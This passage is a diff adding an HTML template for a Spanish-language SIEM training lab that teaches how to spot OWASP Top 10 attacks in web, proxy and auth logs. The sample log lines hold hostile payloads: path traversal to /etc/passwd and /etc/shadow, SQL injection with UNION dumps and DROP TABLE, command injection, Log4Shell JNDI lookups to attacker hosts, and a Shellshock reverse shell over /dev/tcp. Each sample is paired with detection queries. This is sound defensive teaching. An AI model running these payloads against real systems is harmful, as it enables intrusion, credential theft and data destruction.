@@ -1,0 +1,536 @@
+{% extends 'base.html' %}
+{% block title %}SIEM Log Analysis Lab — OWASP Top 10{% endblock %}
+
+{% block content %}
+<div class="sl-layout">
+
+  {# ── SIDEBAR ── #}
+  <nav class="sl-sidebar">
+    <div class="sl-sidebar-header">
+      <div class="sl-sidebar-badge">SIEM Lab</div>
+      <div class="sl-sidebar-subtitle">OWASP Top 10 · 2021</div>
+    </div>
+    <ul class="sl-nav-list">
+      <li><a href="#a01" class="sl-nav-item"><span class="sl-nid sl-nid-crit">A01</span><span class="sl-ntitle">Broken Access Control</span></a></li>
+      <li><a href="#a02" class="sl-nav-item"><span class="sl-nid sl-nid-high">A02</span><span class="sl-ntitle">Cryptographic Failures</span></a></li>
+      <li><a href="#a03" class="sl-nav-item"><span class="sl-nid sl-nid-crit">A03</span><span class="sl-ntitle">Injection</span></a></li>
+      <li><a href="#a04" class="sl-nav-item"><span class="sl-nid sl-nid-med">A04</span><span class="sl-ntitle">Insecure Design</span></a></li>
+      <li><a href="#a05" class="sl-nav-item"><span class="sl-nid sl-nid-high">A05</span><span class="sl-ntitle">Security Misconfiguration</span></a></li>
+      <li><a href="#a06" class="sl-nav-item"><span class="sl-nid sl-nid-high">A06</span><span class="sl-ntitle">Vulnerable Components</span></a></li>
+      <li><a href="#a07" class="sl-nav-item"><span class="sl-nid sl-nid-crit">A07</span><span class="sl-ntitle">Auth Failures</span></a></li>
+      <li><a href="#a08" class="sl-nav-item"><span class="sl-nid sl-nid-high">A08</span><span class="sl-ntitle">Integrity Failures</span></a></li>
+      <li><a href="#a09" class="sl-nav-item"><span class="sl-nid sl-nid-high">A09</span><span class="sl-ntitle">Logging Failures</span></a></li>
+      <li><a href="#a10" class="sl-nav-item"><span class="sl-nid sl-nid-high">A10</span><span class="sl-ntitle">SSRF</span></a></li>
+    </ul>
+    <div class="sl-sidebar-legend">
+      <div class="sl-legend-item"><span class="sl-dot sl-dot-crit"></span> Crítico</div>
+      <div class="sl-legend-item"><span class="sl-dot sl-dot-high"></span> Alto</div>
+      <div class="sl-legend-item"><span class="sl-dot sl-dot-med"></span> Medio</div>
+    </div>
+  </nav>
+
+  {# ── MAIN CONTENT ── #}
+  <main class="sl-main">
+
+    <div class="sl-hero">
+      <div class="sl-hero-label">// SIEM LOG ANALYSIS LAB</div>
+      <h1 class="sl-hero-title">OWASP Top 10 en logs reales</h1>
+      <p class="sl-hero-desc">Aprende a identificar los 10 ataques más críticos analizando logs auténticos de servidores web, sistemas de autenticación y firewalls. Para cada ataque: el log real, qué campos mirar, cómo correlacionar eventos y qué son falsos positivos.</p>
+      <div class="sl-hero-chips">
+        <span class="sl-chip">Apache / Nginx</span>
+        <span class="sl-chip">auth.log</span>
+        <span class="sl-chip">Windows Event Log</span>
+        <span class="sl-chip">Proxy / NetFlow</span>
+        <span class="sl-chip">WAF</span>
+      </div>
+    </div>
+
+    {# ════════════════════════════════════ A01 ════════════════════════════════════ #}
+    <section class="sl-section" id="a01">
+      <div class="sl-section-head">
+        <span class="sl-oid sl-oid-crit">A01:2021</span>
+        <h2 class="sl-section-title">Broken Access Control</h2>
+        <span class="sl-sev sl-sev-crit">CRÍTICO</span>
+        <span class="sl-cat">Access Control · IDOR · Path Traversal</span>
+      </div>
+      <p class="sl-intro">El control de acceso falla cuando un usuario puede realizar acciones o acceder a recursos fuera de sus permisos. En logs se manifiesta como acceso exitoso (HTTP 200) a recursos ajenos, enumeración secuencial de IDs, o traversal de directorios.</p>
+
+      <div class="sl-content">
+        <div class="sl-log-block">
+          <div class="sl-log-bar">
+            <span class="sl-log-src">Apache Access Log — IDOR</span>
+            <button class="sl-filter-btn" onclick="slFilterAlerts(this)">Ver solo alertas</button>
+          </div>
+          <div class="sl-log-pre">
+            <div class="sl-line sl-ok"><span class="sl-ln">1</span><span class="sl-lc">10.0.1.5 - alice [17/Mar/2025:14:22:01 +0000] "GET /api/v1/orders/<b>8821</b> HTTP/1.1" 200 1024 "-" "Mozilla/5.0"</span><span class="sl-tag sl-tag-ok">propio</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">2</span><span class="sl-lc">10.0.1.5 - alice [17/Mar/2025:14:22:<b>02</b> +0000] "GET /api/v1/orders/<b>8822</b> HTTP/1.1" 200 891  "-" "Mozilla/5.0"</span><span class="sl-tag sl-tag-warn">ajeno</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">3</span><span class="sl-lc">10.0.1.5 - alice [17/Mar/2025:14:22:<b>03</b> +0000] "GET /api/v1/orders/<b>8823</b> HTTP/1.1" 200 1102 "-" "Mozilla/5.0"</span><span class="sl-tag sl-tag-warn">ajeno</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">4</span><span class="sl-lc">10.0.1.5 - alice [17/Mar/2025:14:22:<b>04</b> +0000] "GET /api/v1/orders/<b>8824</b> HTTP/1.1" 200 934  "-" "Mozilla/5.0"</span><span class="sl-tag sl-tag-warn">ajeno</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">5</span><span class="sl-lc">203.0.113.42 - - [17/Mar/2025:11:33:17 +0000] "GET /download?file=<b>../../../../etc/passwd</b> HTTP/1.1" 200 2156</span><span class="sl-tag sl-tag-crit">traversal</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">6</span><span class="sl-lc">203.0.113.42 - - [17/Mar/2025:11:33:19 +0000] "GET /download?file=<b>..%2F..%2F..%2Fetc%2Fshadow</b> HTTP/1.1" 200 1024</span><span class="sl-tag sl-tag-crit">traversal</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">7</span><span class="sl-lc">198.51.100.10 - - [17/Mar/2025:16:05:03 +0000] "GET <b>/admin/users/delete?id=42</b> HTTP/1.1" 200 312 "-" "curl/7.68"</span><span class="sl-tag sl-tag-crit">priv esc</span></div>
+          </div>
+        </div>
+
+        <div class="sl-panels">
+          <div class="sl-panel">
+            <div class="sl-panel-title">Indicadores clave</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">IDs secuenciales</span>El mismo usuario accede a IDs consecutivos en &lt;1s — enumeración automática de recursos ajenos.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">200 + recurso ajeno</span>Respuesta exitosa a un recurso que no pertenece al usuario autenticado.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">../ o %2F%2E%2E</span>Path traversal en parámetros de descarga. Busca tanto formato URL-encoded como raw.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">/admin sin rol</span>Acceso a endpoints administrativos por usuarios sin privilegios — y con respuesta 200.</div>
+          </div>
+          <div class="sl-panel">
+            <div class="sl-panel-title">Correlación en SIEM</div>
+            <div class="sl-query">COUNT(user=X, endpoint LIKE '/api/*/orders/*') &gt; 10 en 30s<br><br>URI CONTAINS '../' OR '../' encoded (%2F%2E, %2e%2e)<br><br>user_role != 'admin' AND URI CONTAINS '/admin' AND status = 200</div>
+          </div>
+          <div class="sl-panel sl-fp-panel">
+            <div class="sl-panel-title">⚠ Falsos positivos</div>
+            <p>Informes legítimos que generan muchas peticiones (exportación batch). Diferenciar por User-Agent (scripts internos vs navegador) y por si los IDs accedidos son propios del usuario.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    {# ════════════════════════════════════ A02 ════════════════════════════════════ #}
+    <section class="sl-section" id="a02">
+      <div class="sl-section-head">
+        <span class="sl-oid sl-oid-high">A02:2021</span>
+        <h2 class="sl-section-title">Cryptographic Failures</h2>
+        <span class="sl-sev sl-sev-high">ALTO</span>
+        <span class="sl-cat">Data Exposure · Weak TLS · Sensitive data in transit</span>
+      </div>
+      <p class="sl-intro">Datos sensibles transmitidos sin cifrado o con cifrado débil. En logs de proxy o WAF se detecta por credenciales/tokens en parámetros GET (visibles en URL), tráfico HTTP a endpoints sensibles, o negociación de cifrados obsoletos (SSLv3, TLS 1.0, RC4).</p>
+
+      <div class="sl-content">
+        <div class="sl-log-block">
+          <div class="sl-log-bar">
+            <span class="sl-log-src">Proxy / WAF Log — credenciales en claro</span>
+            <button class="sl-filter-btn" onclick="slFilterAlerts(this)">Ver solo alertas</button>
+          </div>
+          <div class="sl-log-pre">
+            <div class="sl-line sl-ok"><span class="sl-ln">1</span><span class="sl-lc">10.0.1.88 - - [15/Jan/2025:10:01:44 +0000] "POST /api/login HTTP/2.0" 200 512 — cipher=TLS_AES_256_GCM_SHA384</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">2</span><span class="sl-lc">10.0.1.44 - - [15/Jan/2025:10:03:11 +0000] "GET /login?<b>username=admin&amp;password=P@ssw0rd!</b> HTTP/1.1" 200 1823</span><span class="sl-tag sl-tag-crit">cred en URL</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">3</span><span class="sl-lc">10.0.1.77 - - [15/Jan/2025:10:05:02 +0000] "<b>http://</b>internal-api.corp/v1/payments/confirm?<b>api_key=sk_live_4xKjP9mNqR</b> HTTP/1.1" 200 89</span><span class="sl-tag sl-tag-crit">token en GET</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">4</span><span class="sl-lc">192.0.2.5 - - [15/Jan/2025:10:07:30 +0000] "GET /api/profile HTTP/1.1" 200 2048 — <b>cipher=TLS_RSA_WITH_RC4_128_MD5</b></span><span class="sl-tag sl-tag-warn">cipher débil</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">5</span><span class="sl-lc">10.0.1.44 - - [15/Jan/2025:10:09:55 +0000] "GET /reset?<b>token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</b> HTTP/1.1" 200 344</span><span class="sl-tag sl-tag-warn">JWT alg=none</span></div>
+          </div>
+        </div>
+
+        <div class="sl-panels">
+          <div class="sl-panel">
+            <div class="sl-panel-title">Indicadores clave</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">password= en GET</span>Credenciales en query string — quedan en logs de proxy, historial del navegador y cabeceras Referer.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">api_key= / token= en URL</span>Secretos en GET son extremadamente peligrosos: se loguean en todos los proxies intermedios.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-yellow">http:// en APIs internas</span>Tráfico interno sin cifrar. Cualquier intermediario en la red puede leerlo.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-yellow">RC4 / SSLv3 / TLS 1.0</span>Cifrados rotos — susceptibles a BEAST, POODLE, DROWN. Busca en logs de cipher negotiation.</div>
+          </div>
+          <div class="sl-panel">
+            <div class="sl-panel-title">Correlación en SIEM</div>
+            <div class="sl-query">URI CONTAINS ('password=','passwd=','api_key=','token=','secret=')<br>AND method = 'GET'<br><br>cipher IN ('RC4','NULL','EXPORT','SSLv3','TLSv1.0')<br><br>dst_port = 80 AND URI CONTAINS '/api/'</div>
+          </div>
+          <div class="sl-panel sl-fp-panel">
+            <div class="sl-panel-title">⚠ Falsos positivos</div>
+            <p>Tokens de CSRF o session IDs en URLs de redirección OAuth (flujo legítimo). Revisar si el token es de corta duración y de un solo uso. Las APIs legacy internas en HTTP pueden ser intencionales pero deben documentarse.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    {# ════════════════════════════════════ A03 ════════════════════════════════════ #}
+    <section class="sl-section" id="a03">
+      <div class="sl-section-head">
+        <span class="sl-oid sl-oid-crit">A03:2021</span>
+        <h2 class="sl-section-title">Injection</h2>
+        <span class="sl-sev sl-sev-crit">CRÍTICO</span>
+        <span class="sl-cat">SQL · Command · LDAP · Log Injection</span>
+      </div>
+      <p class="sl-intro">Datos no confiables enviados como parte de un comando o query. SQL injection es el más común: se detecta por metacaracteres SQL en parámetros, errores HTTP 500 tras intentos, y respuestas anómalamente grandes (dump de tabla). Command injection usa caracteres de shell (<code>; | &amp;&amp; ` $(...)</code>).</p>
+
+      <div class="sl-content">
+        <div class="sl-log-block">
+          <div class="sl-log-bar">
+            <span class="sl-log-src">Apache Access Log — SQL Injection</span>
+            <button class="sl-filter-btn" onclick="slFilterAlerts(this)">Ver solo alertas</button>
+          </div>
+          <div class="sl-log-pre">
+            <div class="sl-line sl-ok"><span class="sl-ln">1</span><span class="sl-lc">185.220.101.55 - - [15/Jan/2025:09:14:20 +0000] "GET /products?id=<b>1</b> HTTP/1.1" 200 4521</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">2</span><span class="sl-lc">185.220.101.55 - - [15/Jan/2025:09:14:31 +0000] "GET /products?id=<b>1'</b> HTTP/1.1" <b>500</b> 234</span><span class="sl-tag sl-tag-warn">error SQL</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">3</span><span class="sl-lc">185.220.101.55 - - [15/Jan/2025:09:14:35 +0000] "GET /products?id=<b>1' OR '1'='1</b> HTTP/1.1" 200 <b>89012</b></span><span class="sl-tag sl-tag-crit">bypass + dump</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">4</span><span class="sl-lc">185.220.101.55 - - [15/Jan/2025:09:14:39 +0000] "GET /products?id=<b>1 UNION SELECT username,password,3,4 FROM users--</b> HTTP/1.1" 200 45123</span><span class="sl-tag sl-tag-crit">UNION dump</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">5</span><span class="sl-lc">185.220.101.55 - - [15/Jan/2025:09:14:44 +0000] "GET /products?id=<b>1; DROP TABLE users;--</b> HTTP/1.1" 500 312</span><span class="sl-tag sl-tag-crit">destructivo</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">6</span><span class="sl-lc">203.0.113.8   - - [15/Jan/2025:09:20:11 +0000] "GET /ping?host=<b>8.8.8.8;cat /etc/passwd</b> HTTP/1.1" 200 2210</span><span class="sl-tag sl-tag-crit">cmd inject</span></div>
+          </div>
+        </div>
+
+        <div class="sl-panels">
+          <div class="sl-panel">
+            <div class="sl-panel-title">Indicadores clave</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">500 → 200 misma IP</span>Secuencia error/éxito: el atacante sondea con una comilla, confirma el error SQL, luego explota.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">Respuesta anómala en bytes</span>Un endpoint normal devuelve 4 KB; un UNION SELECT devuelve 89 KB — dump de tabla completa.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">UNION SELECT / OR 1=1</span>Keywords SQL en parámetros de URL. Buscar también variantes encoded: %27, %20OR%20, %55NION.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-yellow">; | &amp;&amp; en parámetros</span>Metacaracteres de shell en parámetros que ejecutan comandos del SO.</div>
+          </div>
+          <div class="sl-panel">
+            <div class="sl-panel-title">Correlación en SIEM</div>
+            <div class="sl-query">URI MATCHES "(UNION|SELECT|INSERT|DROP|--|'|%27|OR%201=1)"<br>AND src_ip = anterior_500<br><br>status=500 SEGUIDO DE status=200<br>DESDE mismo src_ip EN &lt; 60s<br><br>bytes_sent &gt; (avg_bytes * 10)<br>AND misma URI base</div>
+          </div>
+          <div class="sl-panel sl-fp-panel">
+            <div class="sl-panel-title">⚠ Falsos positivos</div>
+            <p>Campos de búsqueda legítimos con nombres de artículos que contienen comillas (O'Brien, D&amp;D). Las herramientas de pen-testing internas y los escáneres de vulnerabilidades también generarán estas alertas — filtrar por IP de origen autorizado.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    {# ════════════════════════════════════ A04 ════════════════════════════════════ #}
+    <section class="sl-section" id="a04">
+      <div class="sl-section-head">
+        <span class="sl-oid sl-oid-med">A04:2021</span>
+        <h2 class="sl-section-title">Insecure Design</h2>
+        <span class="sl-sev sl-sev-med">MEDIO</span>
+        <span class="sl-cat">Business Logic · Rate Limiting · Unbounded Consumption</span>
+      </div>
+      <p class="sl-intro">Fallos en el diseño del sistema que permiten bypass de lógica de negocio o consumo ilimitado de recursos. Los logs muestran patrones de comportamiento anómalos: velocidad imposible, valores fuera de rango, o flujos que saltan etapas.</p>
+
+      <div class="sl-content">
+        <div class="sl-log-block">
+          <div class="sl-log-bar">
+            <span class="sl-log-src">API Gateway Log — Business Logic Abuse</span>
+            <button class="sl-filter-btn" onclick="slFilterAlerts(this)">Ver solo alertas</button>
+          </div>
+          <div class="sl-log-pre">
+            <div class="sl-line sl-ok"><span class="sl-ln">1</span><span class="sl-lc">10.0.1.5 - user77 [20/Mar/2025:11:00:01 +0000] "POST /api/checkout HTTP/2.0" 200 512 body={"qty":1,"price":29.99}</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">2</span><span class="sl-lc">10.0.1.5 - user77 [20/Mar/2025:11:00:01 +0000] "POST /api/checkout HTTP/2.0" 200 512 body={"qty":1,"price":<b>-0.01</b>}</span><span class="sl-tag sl-tag-warn">precio neg.</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">3</span><span class="sl-lc">10.0.1.5 - user77 [20/Mar/2025:11:00:02 +0000] "POST /api/promo/apply HTTP/2.0" 200 89 body={"code":"SAVE10"} — applied=<b>true</b></span><span class="sl-tag sl-tag-warn">cupón</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">4</span><span class="sl-lc">10.0.1.5 - user77 [20/Mar/2025:11:00:02 +0000] "POST /api/promo/apply HTTP/2.0" 200 89 body={"code":"SAVE10"} — applied=<b>true</b></span><span class="sl-tag sl-tag-crit">reutilizado</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">5</span><span class="sl-lc">10.0.1.5 - bot_x [20/Mar/2025:11:00:03 +0000] "GET /api/tickets/avail HTTP/2.0" 200 1024 — <b>1823 req en 60s</b></span><span class="sl-tag sl-tag-crit">ticket hoarding</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">6</span><span class="sl-lc">10.0.1.5 - user77 [20/Mar/2025:11:00:05 +0000] "POST /api/payment HTTP/2.0" 200 128 — <b>sin pasar por /api/cart</b></span><span class="sl-tag sl-tag-warn">flujo saltado</span></div>
+          </div>
+        </div>
+
+        <div class="sl-panels">
+          <div class="sl-panel">
+            <div class="sl-panel-title">Indicadores clave</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">Valores negativos/extremos</span>Precios, cantidades o IDs negativos que la API acepta — fallo de validación de rangos.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">Acción repetida sin cooldown</span>Mismo endpoint, mismo recurso, misma IP — sin que la API rechace el duplicado.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">Flujo saltado</span>Llamada a /payment sin previa llamada a /cart — salto de etapa en el flujo de negocio.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-yellow">Rate extremo desde 1 IP</span>Miles de req/min desde misma IP — bot agotando inventario o ancho de banda.</div>
+          </div>
+          <div class="sl-panel">
+            <div class="sl-panel-title">Correlación en SIEM</div>
+            <div class="sl-query">misma (user + endpoint + resource) EN &lt; 5s: ALERTA duplicado<br><br>body.price &lt; 0 OR body.qty &lt; 0: ALERTA valor inválido<br><br>POST /payment SIN previo POST /cart<br>DEL mismo session_id EN &lt; 30s<br><br>COUNT(req) &gt; 500 por minuto desde misma IP</div>
+          </div>
+          <div class="sl-panel sl-fp-panel">
+            <div class="sl-panel-title">⚠ Falsos positivos</div>
+            <p>Tests de integración automáticos del equipo de QA. Importaciones batch legítimas con valores aparentemente fuera de rango. Usuarios que navegan rápido entre páginas. Diferenciar por User-Agent y por si la IP está en rangos de testing.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    {# ════════════════════════════════════ A05 ════════════════════════════════════ #}
+    <section class="sl-section" id="a05">
+      <div class="sl-section-head">
+        <span class="sl-oid sl-oid-high">A05:2021</span>
+        <h2 class="sl-section-title">Security Misconfiguration</h2>
+        <span class="sl-sev sl-sev-high">ALTO</span>
+        <span class="sl-cat">Default Creds · Exposed Files · Directory Listing · Verbose Errors</span>
+      </div>
+      <p class="sl-intro">Configuraciones por defecto sin endurecer, archivos sensibles accesibles, mensajes de error con stack traces, o paneles de administración expuestos. Los attackers reconocen primero — busca en logs accesos a rutas típicas de fingerprinting.</p>
+
+      <div class="sl-content">
+        <div class="sl-log-block">
+          <div class="sl-log-bar">
+            <span class="sl-log-src">Nginx Access Log — Reconnaissance &amp; Exposed Files</span>
+            <button class="sl-filter-btn" onclick="slFilterAlerts(this)">Ver solo alertas</button>
+          </div>
+          <div class="sl-log-pre">
+            <div class="sl-line sl-ok"><span class="sl-ln">1</span><span class="sl-lc">203.0.113.42 - - [22/Mar/2025:08:00:01 +0000] "GET / HTTP/1.1" 200 8192</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">2</span><span class="sl-lc">203.0.113.42 - - [22/Mar/2025:08:00:03 +0000] "GET <b>/.env</b> HTTP/1.1" <b>200</b> 1024</span><span class="sl-tag sl-tag-crit">creds expuesto</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">3</span><span class="sl-lc">203.0.113.42 - - [22/Mar/2025:08:00:04 +0000] "GET <b>/phpinfo.php</b> HTTP/1.1" 200 48291</span><span class="sl-tag sl-tag-warn">fingerprint</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">4</span><span class="sl-lc">203.0.113.42 - - [22/Mar/2025:08:00:05 +0000] "GET <b>/.git/config</b> HTTP/1.1" 200 312</span><span class="sl-tag sl-tag-crit">repo expuesto</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">5</span><span class="sl-lc">203.0.113.42 - - [22/Mar/2025:08:00:06 +0000] "GET <b>/backup.sql</b> HTTP/1.1" 200 5242880</span><span class="sl-tag sl-tag-crit">DB dump</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">6</span><span class="sl-lc">203.0.113.42 - - [22/Mar/2025:08:00:08 +0000] "GET <b>/wp-admin/</b> HTTP/1.1" 200 18291</span><span class="sl-tag sl-tag-warn">admin panel</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">7</span><span class="sl-lc">203.0.113.42 - - [22/Mar/2025:08:00:10 +0000] "GET <b>/api/swagger-ui.html</b> HTTP/1.1" 200 45100</span><span class="sl-tag sl-tag-warn">API docs</span></div>
+          </div>
+        </div>
+
+        <div class="sl-panels">
+          <div class="sl-panel">
+            <div class="sl-panel-title">Indicadores clave</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">/.env · /.git/ · /backup</span>Archivos críticos expuestos. Si el status es 200 = brecha inmediata. El 403 no es suficiente — el archivo no debería existir en web root.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">Scan de rutas conocidas</span>Muchos accesos 404/403 a rutas comunes en poco tiempo — enumeración de wordlist (dirbuster, gobuster).</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-yellow">phpinfo.php / swagger</span>Revelan versiones de software, configuración de servidor, rutas internas — información para el atacante.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-yellow">5 MB en backup.sql</span>La respuesta descomunal (5 MB desde ruta inesperada) indica descarga de dump completo.</div>
+          </div>
+          <div class="sl-panel">
+            <div class="sl-panel-title">Correlación en SIEM</div>
+            <div class="sl-query">URI IN ('/.env','/.git/config','/backup.sql',<br>'/phpinfo.php','/.htpasswd','/web.config')<br>AND status = 200 → CRÍTICO<br><br>COUNT(status=404) &gt; 50 en 60s<br>desde misma IP → escaneo<br><br>respuesta_bytes &gt; 1MB<br>AND URI NOT IN rutas_conocidas</div>
+          </div>
+          <div class="sl-panel sl-fp-panel">
+            <div class="sl-panel-title">⚠ Falsos positivos</div>
+            <p>Escáneres de seguridad propios (Nikto, Nuclei), crawlers de motores de búsqueda accediendo a robots.txt y sitemap. Para /wp-admin y similares: verificar si la aplicación realmente usa WordPress — puede ser legítimo.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    {# ════════════════════════════════════ A06 ════════════════════════════════════ #}
+    <section class="sl-section" id="a06">
+      <div class="sl-section-head">
+        <span class="sl-oid sl-oid-high">A06:2021</span>
+        <h2 class="sl-section-title">Vulnerable &amp; Outdated Components</h2>
+        <span class="sl-sev sl-sev-high">ALTO</span>
+        <span class="sl-cat">Log4Shell · Shellshock · CVE Exploitation</span>
+      </div>
+      <p class="sl-intro">Explotación de vulnerabilidades conocidas en librerías o frameworks. Los payloads de CVEs famosos son muy reconocibles en logs — Log4Shell usa JNDI, Shellshock usa <code>() { :;}</code> en User-Agent. La firma es prácticamente única.</p>
+
+      <div class="sl-content">
+        <div class="sl-log-block">
+          <div class="sl-log-bar">
+            <span class="sl-log-src">Apache / Java App Log — CVE Exploitation Attempts</span>
+            <button class="sl-filter-btn" onclick="slFilterAlerts(this)">Ver solo alertas</button>
+          </div>
+          <div class="sl-log-pre">
+            <div class="sl-line sl-crit"><span class="sl-ln">1</span><span class="sl-lc">45.33.32.156 - - [10/Dec/2024:06:11:02 +0000] "GET / HTTP/1.1" 200 8192 "<b>${jndi:ldap://45.33.32.156:1389/a}</b>" "Mozilla/5.0"</span><span class="sl-tag sl-tag-crit">Log4Shell</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">2</span><span class="sl-lc">45.33.32.156 - - [10/Dec/2024:06:11:04 +0000] "GET / HTTP/1.1" 200 8192 "<b>${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}</b>" "curl/7.68"</span><span class="sl-tag sl-tag-crit">Log4Shell bypass</span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">3</span><span class="sl-lc">198.51.100.9 - - [10/Dec/2024:07:22:31 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 128 "-" "<b>() { :; }; /bin/bash -i &gt;&amp; /dev/tcp/198.51.100.9/4444 0&gt;&amp;1</b>"</span><span class="sl-tag sl-tag-crit">Shellshock</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">4</span><span class="sl-lc">192.0.2.100  - - [10/Dec/2024:08:01:15 +0000] "POST /struts2/login HTTP/1.1" 200 512 content-type="<b>%{(#_='multipart/form-data').(#_memberAccess['allowStaticMethodAccess']=true)</b>"</span><span class="sl-tag sl-tag-crit">Struts2</span></div>
+          </div>
+        </div>
+
+        <div class="sl-panels">
+          <div class="sl-panel">
+            <div class="sl-panel-title">Indicadores clave</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">${jndi: en cualquier campo</span>Log4Shell (CVE-2021-44228). Buscar en User-Agent, X-Forwarded-For, Referer, parámetros, cabeceras custom. También variantes encoded: %24%7bjndi%3a.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">() { :;} en User-Agent</span>Shellshock (CVE-2014-6271). Antiguo pero aún se intenta — muchos servidores sin parchear.</div>
+            <div class="sl-ind"><span class="sl-ichip sl-ichip-red">JNDI callbacks en DNS/Net</span>Log4Shell exitoso genera una conexión saliente del servidor víctima — correlacionar logs de red.</div>
+          </div>
+          <div class="sl-panel">
+            <div class="sl-panel-title">Correlación en SIEM</div>
+            <div class="sl-query">ANY_FIELD CONTAINS 'jndi:' OR '${' → Log4Shell<br><br>user_agent CONTAINS '() { :;}'<br>→ Shellshock<br><br>Log4Shell detectado EN app-server<br>+ conexión saliente a IP externa<br>desde app-server EN &lt; 30s → EXPLOTACIÓN CONFIRMADA</div>
+          </div>
+          <div class="sl-panel sl-fp-panel">
+            <div class="sl-panel-title">⚠ Falsos positivos</div>
+            <p>Casi ninguno para estos patrones — son muy específicos. Los escáneres de vulnerabilidades propios pueden generar estas firmas. Crear lista blanca por IP de escáneres autorizados. Priorizar siempre como CRÍTICO hasta demostrar lo contrario.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    {# ════════════════════════════════════ A07 ════════════════════════════════════ #}
+    <section class="sl-section" id="a07">
+      <div class="sl-section-head">
+        <span class="sl-oid sl-oid-crit">A07:2021</span>
+        <h2 class="sl-section-title">Identification &amp; Authentication Failures</h2>
+        <span class="sl-sev sl-sev-crit">CRÍTICO</span>
+        <span class="sl-cat">Brute Force · Credential Stuffing · Password Spray</span>
+      </div>
+      <p class="sl-intro">Ataques contra el sistema de autenticación. Brute force: muchas contraseñas para un usuario. Credential stuffing: credenciales robadas de otras brechas. Password spray: una contraseña común contra muchos usuarios. El patrón temporal diferencia entre ellos.</p>
+
+      <div class="sl-content">
+        <div class="sl-log-block">
+          <div class="sl-log-bar">
+            <span class="sl-log-src">auth.log — SSH Brute Force con éxito final</span>
+            <button class="sl-filter-btn" onclick="slFilterAlerts(this)">Ver solo alertas</button>
+          </div>
+          <div class="sl-log-pre">
+            <div class="sl-line sl-warn"><span class="sl-ln">1</span><span class="sl-lc">Jan 15 08:00:01 CORP-DC01 sshd[12341]: <b>Failed password</b> for <b>admin</b> from <b>45.33.32.156</b> port 54231 ssh2</span><span class="sl-tag sl-tag-warn">intento 1</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">2</span><span class="sl-lc">Jan 15 08:00:02 CORP-DC01 sshd[12342]: <b>Failed password</b> for admin from 45.33.32.156 port 54232 ssh2</span><span class="sl-tag sl-tag-warn">intento 2</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">3</span><span class="sl-lc">Jan 15 08:00:03 CORP-DC01 sshd[12343]: <b>Failed password</b> for admin from 45.33.32.156 port 54233 ssh2</span><span class="sl-tag sl-tag-warn">intento 3</span></div>
+            <div class="sl-line sl-warn"><span class="sl-ln">...</span><span class="sl-lc"><i style="color:#4a5568">[ 44 intentos fallidos en 44 segundos ]</i></span></div>
+            <div class="sl-line sl-crit"><span class="sl-ln">47</span><span class="sl-lc">Jan 15 08:00:47 CORP-DC01 sshd[12401]: <b>Accepted password</b> for admin from 45.33.32.156 port 54301 ssh2</span><span class="sl-tag sl-tag-crit">ACCESO OK</span></div>
